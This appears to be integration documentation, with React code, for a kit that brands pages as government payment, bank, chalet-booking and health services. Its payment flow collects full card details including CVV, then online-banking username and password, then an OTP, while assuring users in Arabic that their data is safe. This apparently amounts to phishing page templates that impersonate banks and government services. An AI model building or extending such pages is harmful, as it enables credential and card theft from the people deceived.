# Dynamic Identity System - Integration Examples

This document provides practical examples of integrating the Dynamic Identity System into existing pages.

## Table of Contents

1. [Payment Pages](#payment-pages)
2. [Invoice Pages](#invoice-pages)
3. [Contract Pages](#contract-pages)
4. [Chalet Pages](#chalet-pages)
5. [Health Services](#health-services)
6. [Bank Pages](#bank-pages)

---

## Payment Pages

### Example 1: Payment Recipient Page

**Before:**
```tsx
// pages/PaymentRecipient.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';

function PaymentRecipient() {
  const [recipientName, setRecipientName] = useState('');
  const [amount, setAmount] = useState('');
  const navigate = useNavigate();
  const { id } = useParams();

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate(`/pay/${id}/details`);
  };

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-2xl font-bold mb-4">بيانات المستلم</h1>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="اسم المستلم"
          value={recipientName}
          onChange={(e) => setRecipientName(e.target.value)}
        />
        <input
          type="number"
          placeholder="المبلغ"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
        />
        <button type="submit">التالي</button>
      </form>
    </div>
  );
}
```

**After (with Dynamic Identity):**
```tsx
// pages/PaymentRecipient.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityFormLayout } from '@/components/IdentityPageLayout';
import { useEntityIdentity } from '@/components/DynamicIdentity';
import { setCurrentEntity } from '@/lib/dynamicIdentity';

function PaymentRecipient() {
  const [recipientName, setRecipientName] = useState('');
  const [amount, setAmount] = useState('');
  const navigate = useNavigate();
  const { id } = useParams();
  const identity = useEntityIdentity('government_payment');

  const handleSubmit = (e) => {
    e.preventDefault();
    setCurrentEntity('government_payment');
    navigate(`/pay/${id}/details`);
  };

  return (
    <IdentityFormLayout
      entityKey="government_payment"
      title="بيانات المستلم"
      description="أدخل معلومات المستلم والمبلغ المراد دفعه"
      onSubmit={handleSubmit}
      submitLabel="التالي"
    >
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium mb-2">اسم المستلم</label>
          <input
            type="text"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            placeholder="أدخل اسم المستلم"
            value={recipientName}
            onChange={(e) => setRecipientName(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>
        <div>
          <label className="block text-sm font-medium mb-2">المبلغ</label>
          <input
            type="number"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            placeholder="أدخل المبلغ"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>
      </div>
    </IdentityFormLayout>
  );
}
```

### Example 2: Payment Bank Selector

**With Dynamic Identity:**
```tsx
// pages/PaymentBankSelector.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityPageLayout } from '@/components/IdentityPageLayout';
import { IdentityCard, IdentityButton } from '@/components/DynamicIdentity';
import { banks } from '@/lib/banks';

function PaymentBankSelector() {
  const [selectedBank, setSelectedBank] = useState('');
  const navigate = useNavigate();
  const { id } = useParams();

  const handleContinue = () => {
    if (selectedBank) {
      navigate(`/pay/${id}/card-input`);
    }
  };

  return (
    <IdentityPageLayout
      entityKey="bank_pages"
      headerTitle="اختيار البنك"
      headerSubtitle="اختر البنك المصدر لبطاقتك"
    >
      <IdentityCard entityKey="bank_pages">
        <h2 className="text-2xl font-bold mb-6">اختر البنك</h2>
        
        <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {banks.map((bank) => (
            <button
              key={bank.id}
              onClick={() => setSelectedBank(bank.id)}
              className={`p-4 border-2 rounded-lg transition-all ${
                selectedBank === bank.id
                  ? 'border-current shadow-lg'
                  : 'border-gray-200 hover:border-gray-300'
              }`}
              style={{
                borderColor: selectedBank === bank.id ? 'var(--identity-primary)' : undefined
              }}
            >
              <img
                src={bank.logo}
                alt={bank.nameAr}
                className="h-12 mx-auto mb-2"
              />
              <p className="text-sm text-center">{bank.nameAr}</p>
            </button>
          ))}
        </div>

        <IdentityButton
          entityKey="bank_pages"
          variant="primary"
          onClick={handleContinue}
          disabled={!selectedBank}
          className="w-full"
        >
          متابعة
        </IdentityButton>
      </IdentityCard>
    </IdentityPageLayout>
  );
}
```

### Example 3: Payment Card Input

**With Dynamic Identity and Progress:**
```tsx
// pages/PaymentCardInput.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityPaymentLayout } from '@/components/IdentityPageLayout';
import { IdentityButton } from '@/components/DynamicIdentity';
import { useEntityIdentity } from '@/components/DynamicIdentity';

function PaymentCardInput() {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const navigate = useNavigate();
  const { id } = useParams();
  const identity = useEntityIdentity('bank_pages');

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate(`/pay/${id}/bank-login`);
  };

  return (
    <IdentityPaymentLayout
      entityKey="bank_pages"
      currentStep={2}
      totalSteps={5}
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <h2 className="text-2xl font-bold">معلومات البطاقة</h2>

        <div>
          <label className="block text-sm font-medium mb-2">رقم البطاقة</label>
          <input
            type="text"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            placeholder="1234 5678 9012 3456"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            maxLength={19}
            required
          />
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium mb-2">تاريخ الانتهاء</label>
            <input
              type="text"
              className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              style={{ borderColor: identity?.colors.primary }}
              maxLength={5}
              required
            />
          </div>
          <div>
            <label className="block text-sm font-medium mb-2">CVV</label>
            <input
              type="text"
              className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
              placeholder="123"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              style={{ borderColor: identity?.colors.primary }}
              maxLength={4}
              required
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">اسم حامل البطاقة</label>
          <input
            type="text"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            placeholder="الاسم كما هو على البطاقة"
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div className="flex gap-4">
          <IdentityButton
            entityKey="bank_pages"
            variant="outline"
            onClick={() => navigate(-1)}
            className="flex-1"
            type="button"
          >
            السابق
          </IdentityButton>
          <IdentityButton
            entityKey="bank_pages"
            variant="primary"
            type="submit"
            className="flex-1"
          >
            التالي
          </IdentityButton>
        </div>
      </form>
    </IdentityPaymentLayout>
  );
}
```

---

## Invoice Pages

### Example: Create Invoice Page

```tsx
// pages/CreateInvoice.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityFormLayout } from '@/components/IdentityPageLayout';
import { useEntityIdentity } from '@/components/DynamicIdentity';

function CreateInvoice() {
  const [invoiceData, setInvoiceData] = useState({
    clientName: '',
    amount: '',
    description: '',
    dueDate: ''
  });
  const navigate = useNavigate();
  const { country } = useParams();
  const identity = useEntityIdentity('invoices');

  const handleSubmit = (e) => {
    e.preventDefault();
    // Save invoice logic here
    navigate(`/invoices/list/${country}`);
  };

  return (
    <IdentityFormLayout
      entityKey="invoices"
      title="إنشاء فاتورة جديدة"
      description="أدخل تفاصيل الفاتورة"
      onSubmit={handleSubmit}
      submitLabel="إنشاء الفاتورة"
      showCancel={true}
      onCancel={() => navigate(-1)}
    >
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium mb-2">اسم العميل</label>
          <input
            type="text"
            className="w-full px-4 py-3 border rounded-lg"
            value={invoiceData.clientName}
            onChange={(e) => setInvoiceData({...invoiceData, clientName: e.target.value})}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">المبلغ</label>
          <input
            type="number"
            className="w-full px-4 py-3 border rounded-lg"
            value={invoiceData.amount}
            onChange={(e) => setInvoiceData({...invoiceData, amount: e.target.value})}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">الوصف</label>
          <textarea
            className="w-full px-4 py-3 border rounded-lg"
            rows={4}
            value={invoiceData.description}
            onChange={(e) => setInvoiceData({...invoiceData, description: e.target.value})}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">تاريخ الاستحقاق</label>
          <input
            type="date"
            className="w-full px-4 py-3 border rounded-lg"
            value={invoiceData.dueDate}
            onChange={(e) => setInvoiceData({...invoiceData, dueDate: e.target.value})}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>
      </div>
    </IdentityFormLayout>
  );
}
```

---

## Contract Pages

### Example: Contract Management Dashboard

```tsx
// pages/Contracts.tsx
import { useState, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityDashboardLayout } from '@/components/IdentityPageLayout';
import { IdentityCard, IdentityButton } from '@/components/DynamicIdentity';

function Contracts() {
  const [contracts, setContracts] = useState([]);
  const navigate = useNavigate();
  const { country } = useParams();

  useEffect(() => {
    // Load contracts
    // setContracts(loadedContracts);
  }, [country]);

  return (
    <IdentityDashboardLayout
      entityKey="contracts"
      title="إدارة العقود"
      actions={
        <IdentityButton 
          entityKey="contracts" 
          variant="primary"
          onClick={() => navigate(`/contracts/${country}/create`)}
        >
          عقد جديد
        </IdentityButton>
      }
    >
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {contracts.map((contract) => (
          <IdentityCard key={contract.id} entityKey="contracts">
            <h3 className="text-lg font-bold mb-2">{contract.title}</h3>
            <p className="text-sm text-gray-600 mb-4">{contract.clientName}</p>
            <div className="flex justify-between items-center">
              <span className="text-sm">{contract.status}</span>
              <IdentityButton
                entityKey="contracts"
                variant="outline"
                onClick={() => navigate(`/contracts/${contract.id}/view`)}
              >
                عرض
              </IdentityButton>
            </div>
          </IdentityCard>
        ))}
      </div>
    </IdentityDashboardLayout>
  );
}
```

---

## Chalet Pages

### Example: Chalet Booking Page

```tsx
// pages/CreateChaletLink.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityPageLayout } from '@/components/IdentityPageLayout';
import { IdentityCard, IdentityButton } from '@/components/DynamicIdentity';

function CreateChaletLink() {
  const [selectedChalet, setSelectedChalet] = useState(null);
  const [checkIn, setCheckIn] = useState('');
  const [checkOut, setCheckOut] = useState('');
  const navigate = useNavigate();
  const { country } = useParams();

  const chalets = [
    { id: 1, name: 'شاليه الريان', price: 500, image: '/chalets/1.jpg' },
    { id: 2, name: 'شاليه الأمل', price: 700, image: '/chalets/2.jpg' },
    { id: 3, name: 'شاليه النخيل', price: 600, image: '/chalets/3.jpg' },
  ];

  return (
    <IdentityPageLayout
      entityKey="chalets"
      headerTitle="حجز الشاليهات"
      headerSubtitle="اختر الشاليه المناسب لك"
      showAnimatedImages={true}
    >
      <div className="space-y-6">
        <IdentityCard entityKey="chalets">
          <h2 className="text-2xl font-bold mb-4">اختر الشاليه</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {chalets.map((chalet) => (
              <div
                key={chalet.id}
                className={`border-2 rounded-lg overflow-hidden cursor-pointer transition-all ${
                  selectedChalet?.id === chalet.id
                    ? 'border-current shadow-lg'
                    : 'border-gray-200'
                }`}
                style={{
                  borderColor: selectedChalet?.id === chalet.id ? 'var(--identity-primary)' : undefined
                }}
                onClick={() => setSelectedChalet(chalet)}
              >
                <img src={chalet.image} alt={chalet.name} className="w-full h-48 object-cover" />
                <div className="p-4">
                  <h3 className="font-bold text-lg">{chalet.name}</h3>
                  <p className="text-2xl font-bold" style={{ color: 'var(--identity-primary)' }}>
                    {chalet.price} ريال/ليلة
                  </p>
                </div>
              </div>
            ))}
          </div>
        </IdentityCard>

        {selectedChalet && (
          <IdentityCard entityKey="chalets">
            <h2 className="text-2xl font-bold mb-4">تحديد التواريخ</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
              <div>
                <label className="block text-sm font-medium mb-2">تاريخ الوصول</label>
                <input
                  type="date"
                  className="w-full px-4 py-3 border rounded-lg"
                  value={checkIn}
                  onChange={(e) => setCheckIn(e.target.value)}
                  style={{ borderColor: 'var(--identity-primary)' }}
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">تاريخ المغادرة</label>
                <input
                  type="date"
                  className="w-full px-4 py-3 border rounded-lg"
                  value={checkOut}
                  onChange={(e) => setCheckOut(e.target.value)}
                  style={{ borderColor: 'var(--identity-primary)' }}
                />
              </div>
            </div>

            <IdentityButton
              entityKey="chalets"
              variant="primary"
              className="w-full"
              disabled={!checkIn || !checkOut}
            >
              حجز الآن
            </IdentityButton>
          </IdentityCard>
        )}
      </div>
    </IdentityPageLayout>
  );
}
```

---

## Health Services

### Example: Health Services Portal

```tsx
// pages/HealthServices.tsx
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityPageLayout } from '@/components/IdentityPageLayout';
import { IdentityCard, IdentityButton } from '@/components/DynamicIdentity';

function HealthServices() {
  const navigate = useNavigate();
  const { country } = useParams();

  const services = [
    { id: 1, name: 'حجز موعد', icon: '📅', description: 'احجز موعدك مع الطبيب' },
    { id: 2, name: 'الوصفات الطبية', icon: '💊', description: 'تجديد وصفاتك الطبية' },
    { id: 3, name: 'النتائج المخبرية', icon: '🧪', description: 'استعرض نتائج التحاليل' },
    { id: 4, name: 'الاستشارات', icon: '👨‍⚕️', description: 'استشارة طبية عن بعد' },
  ];

  return (
    <IdentityPageLayout
      entityKey="health_links"
      headerTitle="الخدمات الصحية"
      headerSubtitle="خدماتك الصحية في مكان واحد"
    >
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {services.map((service) => (
          <IdentityCard key={service.id} entityKey="health_links">
            <div className="text-center">
              <div className="text-6xl mb-4">{service.icon}</div>
              <h3 className="text-xl font-bold mb-2">{service.name}</h3>
              <p className="text-gray-600 mb-4">{service.description}</p>
              <IdentityButton
                entityKey="health_links"
                variant="primary"
                className="w-full"
              >
                الوصول للخدمة
              </IdentityButton>
            </div>
          </IdentityCard>
        ))}
      </div>
    </IdentityPageLayout>
  );
}
```

---

## Bank Pages

### Example: Bank Login Page

```tsx
// pages/PaymentBankLogin.tsx
import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { IdentityPaymentLayout } from '@/components/IdentityPageLayout';
import { IdentityButton } from '@/components/DynamicIdentity';
import { useEntityIdentity } from '@/components/DynamicIdentity';

function PaymentBankLogin() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate();
  const { id } = useParams();
  const identity = useEntityIdentity('bank_pages');

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate(`/pay/${id}/otp/${Date.now()}`);
  };

  return (
    <IdentityPaymentLayout
      entityKey="bank_pages"
      currentStep={3}
      totalSteps={5}
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="text-center mb-6">
          <h2 className="text-2xl font-bold">تسجيل الدخول البنكي</h2>
          <p className="text-gray-600 mt-2">سيتم التحقق من هويتك عبر البنك</p>
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">اسم المستخدم</label>
          <input
            type="text"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium mb-2">كلمة المرور</label>
          <input
            type="password"
            className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={{ borderColor: identity?.colors.primary }}
            required
          />
        </div>

        <div className="bg-blue-50 p-4 rounded-lg">
          <p className="text-sm text-blue-800">
            🔒 هذه عملية آمنة. بياناتك محمية ولن يتم مشاركتها.
          </p>
        </div>

        <IdentityButton
          entityKey="bank_pages"
          variant="primary"
          type="submit"
          className="w-full"
        >
          تسجيل الدخول
        </IdentityButton>
      </form>
    </IdentityPaymentLayout>
  );
}
```

---

## Tips for Integration

### 1. Maintain Entity Context
Always pass or detect the entity key throughout the user flow:

```tsx
// When navigating
navigate(`/next-page?entity=${entityKey}`);

// Or set it in state
setCurrentEntity(entityKey);
```

### 2. Use Consistent Styling
Apply identity colors to form inputs:

```tsx
const identity = useEntityIdentity();

<input
  style={{ 
    borderColor: identity?.colors.primary,
    fontFamily: identity ? getFontFamily(identity.fonts) : undefined
  }}
/>
```

### 3. Handle Missing Entities
Always provide fallback rendering:

```tsx
const identity = useEntityIdentity(entityKey);

if (!identity) {
  return <DefaultLayout>{children}</DefaultLayout>;
}
```

### 4. Performance Optimization
Disable features not needed:

```tsx
<IdentityPageLayout
  entityKey="government_payment"
  showAnimatedImages={false}  // Disable if not needed
  showBackground={false}       // Disable for better performance
>
```

---

## Migration Checklist

- [ ] Import identity components
- [ ] Wrap pages with appropriate layout
- [ ] Replace standard buttons with IdentityButton
- [ ] Apply identity colors to form inputs
- [ ] Add entity detection/setting logic
- [ ] Update navigation to preserve entity context
- [ ] Test all entity types
- [ ] Optimize images for production
- [ ] Update links to include entity parameter

---

For more information, see the main [DYNAMIC_IDENTITY_SYSTEM.md](./DYNAMIC_IDENTITY_SYSTEM.md) documentation.
